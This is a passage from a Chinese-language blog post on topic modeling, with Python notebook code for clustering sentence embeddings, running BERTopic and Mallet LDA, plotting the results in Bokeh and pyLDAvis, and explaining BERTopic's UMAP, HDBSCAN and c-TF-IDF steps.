python"><figcaption><span>colab</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">find_optimal_clusters(embeddings, <span class="hljs-number">20</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">clusters_2 = MiniBatchKMeans(n_clusters=<span class="hljs-number">2</span>, init_size=<span class="hljs-number">256</span>, batch_size=<span class="hljs-number">512</span>, random_state=<span class="hljs-number">20</span>).fit_predict(embeddings)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plot_tsne_pca_umap</span><span class="hljs-params">(data, labels)</span>:</span><br>    max_label = max(labels)+<span class="hljs-number">1</span><br>    max_items = np.random.choice(range(data.shape[<span class="hljs-number">0</span>]), size=<span class="hljs-number">2700</span>, replace=<span class="hljs-literal">False</span>)<br>    <br>    <span class="hljs-comment"># reducer = umap.UMAP(n_components=2)</span><br>    pca = PCA(n_components=<span class="hljs-number">2</span>).fit_transform(data[max_items,:])<br>    tsne = sklearn.manifold.TSNE(n_components=<span class="hljs-number">2</span>).fit_transform(embeddings)<br>    uma = umap.UMAP(n_components=<span class="hljs-number">2</span>).fit_transform(embeddings)<br>    <br>    <br>    idx = np.random.choice(range(pca.shape[<span class="hljs-number">0</span>]), size=<span class="hljs-number">320</span>, replace=<span class="hljs-literal">False</span>)<br>    label_subset = labels[max_items]<br>    label_subset = [cm.hsv(i/max_label) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> label_subset[idx]]<br>    <br>    f, ax = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, figsize=(<span class="hljs-number">14</span>, <span class="hljs-number">6</span>))<br>    <br>    ax[<span class="hljs-number">0</span>].scatter(pca[idx, <span class="hljs-number">0</span>], pca[idx, <span class="hljs-number">1</span>], c=label_subset)<br>    ax[<span class="hljs-number">0</span>].set_title(<span class="hljs-string">'PCA Cluster Plot'</span>)<br>    <br>    ax[<span class="hljs-number">1</span>].scatter(tsne[idx, <span class="hljs-number">0</span>], tsne[idx, <span class="hljs-number">1</span>], c=label_subset)<br>    ax[<span class="hljs-number">1</span>].set_title(<span class="hljs-string">'TSNE Cluster Plot'</span>)<br>    <br>    ax[<span class="hljs-number">2</span>].scatter(uma[idx,<span class="hljs-number">0</span>],uma[idx,<span class="hljs-number">1</span>],c=label_subset)<br>    ax[<span class="hljs-number">2</span>].set_title(<span class="hljs-string">'UMAP Cluster Plot'</span>)<br>    <br>plot_tsne_pca_umap(embeddings, clusters_2)<br></code></pre></div></td></tr></table></figure><h2><span id="topic">Topic</span></h2><h3><span id="bert-topic">BERT topic</span></h3><p>BERTopic依赖于句子嵌入和聚类算法，以及降维，生成文档主题簇。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">model = BERTopic(language=<span class="hljs-string">"english"</span>, min_topic_size=<span class="hljs-number">20</span>)<br>topics, probs = model.fit_transform(texts)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">topic_words = [<span class="hljs-string">'-1: outlier'</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(set(topics))<span class="hljs-number">-1</span>):<br>  tpc = model.get_topic(i)[:<span class="hljs-number">8</span>]<br>  words = [x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tpc]<br>  tw = <span class="hljs-string">' '</span>.join([str(i) + <span class="hljs-string">':'</span>] + words)<br>  topic_words.append(tw)<br><br>exp_topics = [topic_words[x+<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> topics]<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">len(set(topics))<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">clrs = random.sample(Turbo256, len(set(topics)))<br>color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)<br><br>list_x = out[:,<span class="hljs-number">0</span>]<br>list_y = out[:,<span class="hljs-number">1</span>]<br>desc = texts<br><br>source = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=exp_topics, target=targets, dset=sets,))<br>hover = HoverTool(tooltips=[<br>    (<span class="hljs-string">"index"</span>, <span class="hljs-string">"$index"</span>),<br>    (<span class="hljs-string">'desc'</span>, <span class="hljs-string">'@desc'</span>),<br>    (<span class="hljs-string">'topic'</span>, <span class="hljs-string">'@topic'</span>),<br>    (<span class="hljs-string">'target'</span>, <span class="hljs-string">'@target'</span>),<br>    (<span class="hljs-string">'dset'</span>, <span class="hljs-string">'@dset'</span>),<br>])<br><br>p = figure(plot_width=<span class="hljs-number">800</span>, plot_height=<span class="hljs-number">800</span>, tools=[hover], title=<span class="hljs-string">"Topics from BERTopic model"</span>)<br>p.scatter(<span class="hljs-string">'x'</span>, <span class="hljs-string">'y'</span>, size=<span class="hljs-number">10</span>, source=source,<br>         fill_color=transform(<span class="hljs-string">'topic'</span>, color_map),<br>         marker=bokeh.transform.factor_mark(<span class="hljs-string">'dset'</span>, MARKERS, SETS),<br>         legend=<span class="hljs-string">'dset'</span><br>)<br><span class="hljs-comment"># p.legend.location = "top_left"</span><br><span class="hljs-comment"># p.legend.click_policy="hide"</span><br><br>bokeh.plotting.show(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BERT_topic_analysis_pic/image-20210719222310629.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">topic_df = model.get_topic_freq()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_keywords</span><span class="hljs-params">(i)</span>:</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">-1</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'outlier'</span><br>    tpc = model.get_topic(i)[:<span class="hljs-number">8</span>]<br>    words = [x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tpc]<br>    tw = <span class="hljs-string">' '</span>.join(words)<br>    <span class="hljs-keyword">return</span> tw<br><br>topic_df[<span class="hljs-string">'keywords'</span>] = topic_df[<span class="hljs-string">'Topic'</span>].apply(get_keywords)<br><br>topic_df<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">model.get_topic(<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">model.visualize_topics()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># model.visualize_distribution(probs)</span><br></code></pre></div></td></tr></table></figure><h3><span id="classic-lda">Classic LDA</span></h3><figure class="highlight python"><figcaption><span>id</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">!pip install -Uqq gensim==<span class="hljs-number">3.8</span><span class="hljs-number">.3</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># import os       #importing os to set environment variable</span><br><span class="hljs-comment"># def install_java():</span><br><span class="hljs-comment">#   !apt-get install -y openjdk-8-jdk-headless -qq &gt; /dev/null      #install openjdk</span><br><span class="hljs-comment">#   os.environ["JAVA_HOME"] = "/usr/lib/jvm/java-8-openjdk-amd64"     #set environment variable</span><br><span class="hljs-comment">#   !java -version       #check java version</span><br><span class="hljs-comment"># install_java()</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">!wget -q http://mallet.cs.umass.edu/dist/mallet<span class="hljs-number">-2.0</span><span class="hljs-number">.8</span>.zip<br>!unzip -qq mallet<span class="hljs-number">-2.0</span><span class="hljs-number">.8</span>.zip<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">os.environ[<span class="hljs-string">'MALLET_HOME'</span>] = <span class="hljs-string">'/content/mallet-2.0.8'</span><br>mallet_path = <span class="hljs-string">'/content/mallet-2.0.8/bin/mallet'</span> <span class="hljs-comment"># you should NOT need to change this</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gensim<br><span class="hljs-keyword">import</span> gensim.corpora <span class="hljs-keyword">as</span> corpora<br><span class="hljs-keyword">from</span> gensim.utils <span class="hljs-keyword">import</span> simple_preprocess<br><span class="hljs-keyword">from</span> gensim.models.wrappers <span class="hljs-keyword">import</span> LdaMallet<br><span class="hljs-keyword">from</span> gensim.models.coherencemodel <span class="hljs-keyword">import</span> CoherenceModel<br><span class="hljs-keyword">from</span> gensim <span class="hljs-keyword">import</span> similarities<br><br><span class="hljs-keyword">import</span> os.path<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> glob<br><br><span class="hljs-keyword">import</span> nltk<br>nltk.download(<span class="hljs-string">'stopwords'</span>)<br><br><span class="hljs-keyword">from</span> nltk.tokenize <span class="hljs-keyword">import</span> RegexpTokenizer<br><span class="hljs-keyword">from</span> nltk.corpus <span class="hljs-keyword">import</span> stopwords<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">preprocess_data</span><span class="hljs-params">(doc_set,extra_stopwords = &#123;&#125;)</span>:</span><br>    <span class="hljs-comment"># adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python</span><br>    <span class="hljs-comment"># replace all newlines or multiple sequences of spaces with a standard space</span><br>    doc_set = [re.sub(<span class="hljs-string">'\s+'</span>, <span class="hljs-string">' '</span>, doc) <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> doc_set]<br>    <span class="hljs-comment"># initialize regex tokenizer</span><br>    tokenizer = RegexpTokenizer(<span class="hljs-string">r'\w+'</span>)<br>    <span class="hljs-comment"># create English stop words list</span><br>    en_stop = set(stopwords.words(<span class="hljs-string">'english'</span>))<br>    <span class="hljs-comment"># add any extra stopwords</span><br>    <span class="hljs-keyword">if</span> (len(extra_stopwords) &gt; <span class="hljs-number">0</span>):<br>        en_stop = en_stop.union(extra_stopwords)<br>    <br>    <span class="hljs-comment"># list for tokenized documents in loop</span><br>    texts = []<br>    <span class="hljs-comment"># loop through document list</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> doc_set:<br>        <span class="hljs-comment"># clean and tokenize document string</span><br>        raw = i.lower()<br>        tokens = tokenizer.tokenize(raw)<br>        <span class="hljs-comment"># remove stop words from tokens</span><br>        stopped_tokens = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tokens <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> en_stop]<br>        <span class="hljs-comment"># add tokens to list</span><br>        texts.append(stopped_tokens)<br>    <span class="hljs-keyword">return</span> texts<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prepare_corpus</span><span class="hljs-params">(doc_clean)</span>:</span><br>    <span class="hljs-comment"># adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python</span><br>    <span class="hljs-comment"># Creating the term dictionary of our courpus, where every unique term is assigned an index. dictionary = corpora.Dictionary(doc_clean)</span><br>    dictionary = corpora.Dictionary(doc_clean)<br>    <br>    dictionary.filter_extremes(no_below=<span class="hljs-number">5</span>, no_above=<span class="hljs-number">0.5</span>)<br>    <span class="hljs-comment"># Converting list of documents (corpus) into Document Term Matrix using dictionary prepared above.</span><br>    doc_term_matrix = [dictionary.doc2bow(doc) <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> doc_clean]<br>    <span class="hljs-comment"># generate LDA model</span><br>    <span class="hljs-keyword">return</span> dictionary,doc_term_matrix<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">doc_clean = preprocess_data(texts,&#123;&#125;)<br>dictionary, doc_term_matrix = prepare_corpus(doc_clean)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">number_of_topics=<span class="hljs-number">30</span> <span class="hljs-comment"># adjust this to alter the number of topics</span><br>words=<span class="hljs-number">10</span> <span class="hljs-comment">#adjust this to alter the number of words output for the topic below</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ldamallet = LdaMallet(mallet_path, corpus=doc_term_matrix, num_topics=number_of_topics, id2word=dictionary, alpha=<span class="hljs-number">10</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># topic_words = ldamallet.show_topics(num_topics=number_of_topics,num_words=5)</span><br><span class="hljs-comment"># topic_words = [x[1] for x in topic_words]</span><br><br>topic_words = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(number_of_topics):<br>  tpc = ldamallet.show_topic(i, topn=<span class="hljs-number">7</span>, num_words=<span class="hljs-literal">None</span>)<br>  words = [x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tpc]<br>  tw = <span class="hljs-string">' '</span>.join([str(i) + <span class="hljs-string">':'</span>] + words)<br>  topic_words.append(tw)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">topic_words<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># show result</span><br>topics_docs = list()<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> ldamallet[doc_term_matrix[:<span class="hljs-number">1000</span>]]:<br>    topics_docs.append(m)<br><br>x = np.array(topics_docs[:<span class="hljs-number">1000</span>])<br>y = np.delete(x,<span class="hljs-number">0</span>,axis=<span class="hljs-number">2</span>)<br>y = y.squeeze()<br><br>best_topics = np.argmax(y, axis=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 结果是一个分布</span><br>topics = list(best_topics)<br>topics = [topic_words[x] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> topics]<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">clrs = random.sample(Turbo256, number_of_topics)<br>color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)<br><br>list_x = out[:,<span class="hljs-number">0</span>]<br>list_y = out[:,<span class="hljs-number">1</span>]<br>desc = texts<br><br>source = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=topics))<br>hover = HoverTool(tooltips=[<br>    (<span class="hljs-string">"index"</span>, <span class="hljs-string">"$index"</span>),<br>    (<span class="hljs-string">'desc'</span>, <span class="hljs-string">'@desc'</span>),<br>    (<span class="hljs-string">'topic'</span>, <span class="hljs-string">'@topic'</span>)<br>])<br><br>p = figure(plot_width=<span class="hljs-number">1200</span>, plot_height=<span class="hljs-number">600</span>, tools=[hover], title=<span class="hljs-string">"Test"</span>)<br>p.circle(<span class="hljs-string">'x'</span>, <span class="hljs-string">'y'</span>, size=<span class="hljs-number">10</span>, source=source,<br>         fill_color=transform(<span class="hljs-string">'topic'</span>, color_map),<br>         <span class="hljs-comment"># legend='topic'</span><br>)<br><span class="hljs-comment"># p.legend.location = "top_left"</span><br><span class="hljs-comment"># p.legend.click_policy="hide"</span><br><br>bpl.show(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BERT_topic_analysis_pic/image-20210719222356216.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;">看上面的图表，由LDA重新识别的主题内文档不一定相互接近。与BERTopic是互补的，可以得到不同的主题表示。</p><p>Bertopic在短文本这类可能只有一个主题的文本中表现较好，而LDA可以更好地处理主题组合较多的文本。两者可以互补，因此尝试两者都有意义。</p><p>这和两者的原理是相关的，Bertopic是空间距离的聚类，LDA是统计层面的共现规律分析。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># pyLDAvis可视化</span><br>!pip install -Uqq pyLDAvis==<span class="hljs-number">2.1</span><span class="hljs-number">.2</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">gensimmodel = gensim.models.wrappers.ldamallet.malletmodel2ldamodel(ldamallet)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyLDAvis<br><span class="hljs-keyword">import</span> pyLDAvis.gensim<br><br>pyLDAvis.enable_notebook()<br>p = pyLDAvis.gensim.prepare(gensimmodel, doc_term_matrix, dictionary)<br>p<br></code></pre></div></td></tr></table></figure><p>ref: https://skok.ai/2021/05/27/Topic-Models-Introduction.html</p><h3><span id="bertopic-详解">BERTopic 详解</span></h3><p><a href="https://github.com/MaartenGr/BERTopic">BERTopic</a>，利用BERT嵌入和c-TF-IDF来创建密集的集群，使话题易于解释，同时在话题描述中保留重要词汇。其核心步骤主要是做三件事：</p><ul><li>用基于BERT的Sentence Transformers提取语句嵌入</li><li>通过UMAP和HDBSCAN，将文档嵌入进行聚类，语义相近的语句将聚集成簇群</li><li>用c-TF-IDF提取主题词</li></ul><p>c-TF-IDF就是将一个主题下的所有文档连接在一起成为一个文档，在主题间计算TF-IDF的方法。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> jieba<br><span class="hljs-keyword">import</span> umap<br><span class="hljs-keyword">import</span> hdbscan<br><span class="hljs-keyword">from</span> sentence_transformers <span class="hljs-keyword">import</span> SentenceTransformer<br><span class="hljs-keyword">from</span> sklearn.feature_extraction.text <span class="hljs-keyword">import</span> CountVectorizer<br><span class="hljs-keyword">from</span> sklearn.metrics.pairwise <span class="hljs-keyword">import</span> cosine_similarity<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># import sys</span><br><span class="hljs-comment"># sys.setrecursionlimit(1000000)</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># model = SentenceTransformer(r'my_pretrained_chinese_embeddings')</span><br><span class="hljs-comment"># embeddings = model.encode(data['review'].tolist(), show_progress_bar=True)</span><br><br><span class="hljs-comment">#### 降维</span><br>umap_embeddings = umap.UMAP(<br>      n_neighbors=<span class="hljs-number">25</span>,<br>      n_components=<span class="hljs-number">10</span>,<br>      min_dist=<span class="hljs-number">0.00</span>,<br>      metric=<span class="hljs-string">'cosine'</span>,<br>      random_state=<span class="hljs-number">2020</span>).fit_transform(embeddings)<br><br><br><span class="hljs-comment">#### 聚类</span><br><span class="hljs-comment"># 使用HDBSCAN来寻找高密簇</span><br>cluster = hdbscan.HDBSCAN(<br>      min_cluster_size=<span class="hljs-number">30</span>,<br>      metric=<span class="hljs-string">'euclidean'</span>,<br>      cluster_selection_method=<span class="hljs-string">'eom'</span>, <br>      prediction_data=<span class="hljs-literal">True</span>).fit(umap_embeddings)<br><br><br><span class="hljs-comment">#### c-TF-IDF</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">c_tf_idf</span><span class="hljs-params">(documents, m, ngram_range=<span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span>)</span>:</span><br>  my_stopwords =  [i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> open(<span class="hljs-string">'stop_words_zh.txt'</span>,encoding=<span class="hljs-string">'utf-8'</span>).readlines()]<br><br>  count = CountVectorizer(<br>      ngram_range=ngram_range,                             <br>      stop_words= my_stopwords).fit(documents)<br><br>  t = count.transform(documents).toarray()<br><br>  w = t.sum(axis=<span class="hljs-number">1</span>)<br>  tf = np.divide(t.T, w)<br>  <br>  sum_t = t.sum(axis=<span class="hljs-number">0</span>)<br>  idf = np.log(np.divide(m, sum_t)).reshape(<span class="hljs-number">-1</span>, <span class="hljs-number">1</span>)<br>  <br>  tf_idf = np.multiply(tf, idf)<br>  <br>  <span class="hljs-keyword">return</span> tf_idf, count<br><br><br><span class="hljs-comment">####  主题归并</span><br><span class="hljs-comment"># 通过比较主题之间的c-TF-IDF向量，合并最相似的向量，最后重新计算c-TF-IDF向量来更新主题的表示</span><br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BERT </tag>
            
